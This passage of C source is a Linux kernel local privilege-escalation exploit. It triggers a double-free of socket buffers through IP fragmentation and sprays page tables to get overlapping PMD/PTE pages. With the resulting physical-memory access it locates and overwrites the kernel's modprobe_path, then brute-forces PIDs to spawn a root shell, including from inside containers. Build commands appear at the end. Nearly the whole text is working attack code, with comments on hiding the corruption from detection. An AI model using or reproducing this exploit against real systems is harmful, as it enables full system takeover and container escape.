 * [11:0] - Physical address offset
 * [20:12] - PTE
 * [29:21] - PMD
 * [38:30] - PUD
 * [47:39] - PGD
 */
#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
/*
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void *)(_pgd_index_to_virt((unsigned long long)(pud_index)) + \
		  _pud_index_to_virt((unsigned long long)(pmd_index)) + \
		  _pmd_index_to_virt((unsigned long long)(pte_index)) + \
		  _pte_index_to_virt((unsigned long long)(page_index)) + \
		  (unsigned long long)(byte_index)))
*/
#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
	((void *)(_pgd_index_to_virt((unsigned long long)(pgd_index)) + \
		  _pud_index_to_virt((unsigned long long)(pud_index)) + \
		  _pmd_index_to_virt((unsigned long long)(pmd_index)) + \
		  _pte_index_to_virt((unsigned long long)(pte_index)) + \
		  (unsigned long long)(page_index)))

/* privesc is the abbreviation for privilege escalation */
static void privesc_flh_bypass_no_time(int shell_stdin_fd,
				       int shell_stdout_fd)
{
	unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' }; // Set all bytes
	struct ip df_ip_header = {
		.ip_v		= 4, /* version */
		.ip_hl		= 5, /* ip header length (5*4) */
		.ip_tos		= 0, /* type of service */
		.ip_len		= 0xDEAD, /* ip total length */
		.ip_id 		= 0xDEAD, /* id */
		.ip_off		= 0xDEAD, /* frag offset */
		.ip_ttl		= 128, /* time to live */
		.ip_p 		= 70, /* protocol */
		.ip_src.s_addr 	= inet_addr("1.1.1.1"), /* src */
		.ip_dst.s_addr	= inet_addr("255.255.255.255"), /* dst */
	};

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

	printf("[+] running normal privesc\n");

	printf("[+] doing first useless allocs to setup caching and stuff..\n");

	pin_cpu(0);
	
	/* allocate PUD (and a PMD+PTE) for PMD */
	mmap((void *)PTI_TO_VIRT(0, 1, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE,
	     MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long *)PTI_TO_VIRT(0, 1, 0, 0, 0) = 0xDEADBEEF;

	// pre-register spray PTEs, with 0x1000 * 2, so 2 PTEs fit inside when
	// overlapping with PMD needs to be minimal since VMA registration
	// costs memory.
	for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++) {
		void *retv = mmap((void *)PTI_TO_VIRT(1, 0, i, 0, 0), 0x2000,
				  PROT_READ | PROT_WRITE,
				  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
				  -1, 0);
		if (retv == MAP_FAILED) {
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs.
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children.
	for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char *)PTI_TO_VIRT(1, i, 0, 0, 0) = 0x41;
	
	// these use different PTEs but the same PMD.
	// allocate 2 PMDs (2*512*4096=0x400000).
	_pmd_area = mmap((void *)PTI_TO_VIRT(0, 2, 0, 0, 0), 0x400000,
			 PROT_READ | PROT_WRITE,
			 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	printf("[+] allocated VMAs for process:\n"
	       "  - pte_area: ?\n"
	       "  - _pmd_area: %p\n"
	       "  - modprobe_path: '%s' @ %p\n",
	       _pmd_area, modprobe_path, modprobe_path);

	populate_sockets();

	set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated.
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = 2 * sizeof(struct ip) + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

	set_ipfrag_time(9999);

	printf("[+] waiting for the clam before the storm...\n");
	sleep(CONFIG_SEC_BEFORE_STORM);

	// pop N skbs from skb freelist.
	printf("[+] start to reserve udp packets %d\n",
	       CONFIG_SKB_SPRAY_AMOUNT);
	for (int i = 0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		/*
		printf("[+] reserving udp packets... (%d/%d)\n",
		       i, CONFIG_SKB_SPRAY_AMOUNT);
		*/
		alloc_ipv4_udp(1);
	}

	// allocate and free 1 skb from freelist.
	df_ip_header.ip_id = 0x1337;
	// pwndbg> p sizeof(struct sk_buff)
	// $1 = 232
	// if size is 0, sk_buff is allocated by kmalloc-256. But if
	// size is 32768, it will be order 4 (16-page from the
	// buddy-allocator).
	df_ip_header.ip_len = 2 * sizeof(struct ip) + 32768 + 24;
	// wait for other fragments. 8 >> 3 to make it wait or so?
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);
	trigger_double_free_hdr(32768 + 8, &df_ip_header);

	// push N skbs to skb freelist.
	// masking the double-free with skb's, do spray-free the UDP
	// packets we allocated earlier, which will prevent detection
	// of the double-free.
	printf("[+] start to free reserved udp packets to mask "
	       "corrupted packet %d\n", CONFIG_SKB_SPRAY_AMOUNT);
	for (int i = 0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		/*
		printf("[+] freeing reserved upd packets to mask corrupted "
		       "packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);	
		*/
		recv_ipv4_udp(1);
	}

	// spray-allocate the PTEs from PCP allocator order-0 list.
	// in order to spray PTEs we simply access the virtual memory pages
	// in the VMA we registered earlier.
	printf("[+] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char *)PTI_TO_VIRT(1, 0, i, 0, 0) = 0x41;

	printf("[+] double-freeing skb...\n");

	// cause double-free on skb from earlier.
	// we previously drained the PCP list and allocated a bunch of
	// PTEs on the page entry we freed with free 1. Now, we will do
	// free 2 to use its page freelist entry to allocate an
	// overlapping PMD.
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = 2 * sizeof(struct ip) + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);

	// skb1->len gets overwritten by s->random() in set_freepointer().
	// need to discard queue with tricks circumventing skb1->len cause
	// end == offset in ip_frag_queue(). packet will be empty remains
	// running until after both frees, a.k.a. does not require sleep
	alloc_intermed_buf_hdr(0, &df_ip_header);

	// allocate overlapping PMD page (overlaps with PTE).
	*(unsigned long long *)_pmd_area = 0xCAFEBABE;

	printf("[+] checking %d sprayed pte's for overlap...\n",
	       CONFIG_PTE_SPRAY_AMOUNT);

	// find overlapped PTE area
	pte_area = NULL;
	for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++) {
		unsigned long long *test_target_addr = PTI_TO_VIRT(1, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flag,
		// not 0x41.
		if (*test_target_addr != 0x41) {
			printf("[+] confirmed double alloc PMD/PTE\n");
			printf("    - PTE area index: %lld\n", i);
			printf("    - PTE area (write target address/page: "
			       "%016llx (new)\n", *test_target_addr);
			pte_area = test_target_addr;
		}
	}
	if (pte_area == NULL) {
		printf("[-] failed to detect overwritten pte: "
		       "is more PTE spray needed? pmd: %016llx\n",
		       *(unsigned long long *)_pmd_area);
		return;
	}

	// set new pte value for sanity check
	*pte_area = 0x0 | 0x8000000000000867;

        flush_tlb(_pmd_area, 0x400000);
        printf("    - PMD area (read target value/page): %016llx (new)\n",
               *(unsigned long long *)_pmd_area);

        // run this script instead of /sbin/modprobe
        int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
        int status_fd = memfd_create("", 0);

        // range = (k * j) * CONFIG_PHYSICAL_ALIGN
        // scan 512 pages (1 PTE worth) for kernel base each iteration.
        for (int k = 0; k < CONFIG_PHYS_MEM/(CONFIG_PHYSICAL_ALIGN * 512); k++) {
                unsigned long long kernel_iteration_base;

                kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

                for (unsigned short j = 0; j < 512; j++) {
                        pte_area[j] = (kernel_iteration_base +
                                       CONFIG_PHYSICAL_ALIGN * j) |
                                       0x8000000000000867;
                }
                flush_tlb(_pmd_area, 0x400000);

                // scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel
                // base each iteration.
                for (unsigned long long j = 0; j < 512; j++) {
                        unsigned long long phys_kernel_base;

                        // check for x64-gcc/clang signatures of kernel code
                        // segment at rest and at runtime
                        // - this "kernel base" is actually the assembly bytecode
                        //   of start_64() and variants
                        // - it's different per architecture and per compiler
                        //   (clang produces different signature than gcc)
                        // - this can be dericed from the vmlinux file by checking
                        //   the second segment, which starts likely at binary
                        //   offset 0x200000
                        //   - i.e: xxd ./vmlinux | grep '00200000:'

                        phys_kernel_base = kernel_iteration_base +
                                           CONFIG_PHYSICAL_ALIGN * j;
                        if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
                                continue;
                        
                        printf("[+] found possible physical kernel base: %016llx\n",
                               phys_kernel_base);
                        
                        // scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from
                        // kernel base for modprobe path. if not found, just search
                        // for another kernel base.
                        for (int i = 0; i < 40; i++) {
                                void *pmd_modprobe_addr;
                                unsigned long long phys_modprobe_addr;
                                unsigned long long modprobe_iteration_base;

                                modprobe_iteration_base = phys_kernel_base + i * 0x200000;

                                for (unsigned short j = 0; j < 512; j++) {
                                        pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) |
                                                            0x8000000000000867;
                                }
                                flush_tlb(_pmd_area, 0x400000);

#if CONFIG_STATIC_USERMODEHELPER
                                pmd_modprobe_addr = memmem(pmd_data_area, 0x200000,
                                                           CONFIG_STATIC_USERMODEHELPER_PATH,
                                                           strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
                                pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000,
                                                                         modprobe_path, KMOD_PATH_LEN);
#endif
                                if (pmd_modprobe_addr == NULL)
                                        continue;
                                
                                phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr -
                                                     pmd_data_area);
                                printf("[+] verified modprobe_path/usermodehelper_path: %016llx ('%s')...\n",
                                       phys_modprobe_addr, (char *)pmd_modprobe_addr);
                                
                                printf("[+] overwriting path with PIDs in range 0->4194304...\n");
                                for (pid_t pid_guess = 0; pid_guess < 4194304; pid_guess++) {
                                        int status_cnt;
                                        char buf;

                                        // overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
                                        // - use /proc/<pid>/* since container path may differ, may not be accessible,
                                        //   et cetera
                                        // - it must be root namespace PIDs, and can't get the root ns pid from within
                                        //   otehr namespace
                                        MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

                                        lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
                                        dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n" \
                                                "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
                                                pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess,
                                                shell_stdout_fd);
                                        
                                        // run custom modprobe file as root, by triggering it by executing file with
                                        // unknown binfmt if the PID is incorrect, nothing will happen.
                                        modprobe_trigger_memfd();

                                        // indicates correct PID (and root shell). stops further bruteforcing.
                                        status_cnt = read(status_fd, &buf, 1);
                                        if (status_cnt == 0)
                                                continue;
                                        
                                        printf("[+] successfully breached the mainframe as read-PID %u\n", pid_guess);

                                        return;
                                }

                                printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");

                                return;
                        }

                        printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");

                        return;
                }
                        
        }

        printf("[!] failed to find kernel code segment... CONFIG_STATIC_USERMODEHELPER disabled?\n");

        return;
}

void signal_handler_sleep(int sig)
{
	printf("[*] handling ctrl-c by sleeping background thread\n");
	printf("!! >> if you did this while in the root shell, "
	       "the terminal will be messed up << !!\n");
	sleep(9999);
}

// apt install -y libnftnl-dev libmnl-dev
// gcc exp.c -o exp -lnftnl -lmnl
int main()
{
	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
			      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;

	/*
	 * detaches program and makes it sleep in background when
	 * succeeding or failing - prevents kernel system instability
	 * when trying to free resources.
	 */
	if (fork() == 0) { // subprocess
		int shell_stdin_fd;
		int shell_stdout_fd;

		signal(SIGINT, signal_handler_sleep);

		/*
		 * open copies of stdout etc which will not be
		 * redirected when stdout is redirected, but
		 * will be printed to user.
		 */
		shell_stdin_fd = dup(STDIN_FILENO);
		shell_stdout_fd = dup(STDOUT_FILENO);

		setup_env();
		
		privesc_flh_bypass_no_time(shell_stdin_fd,
					   shell_stdout_fd);

		*exploit_status = EXPLOIT_STAT_FINISHED;

		/* prevent crashes due to invalid pagetables */
		sleep(9999);
	}

	/* prevent premature exit */
	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);

	return 0;
}
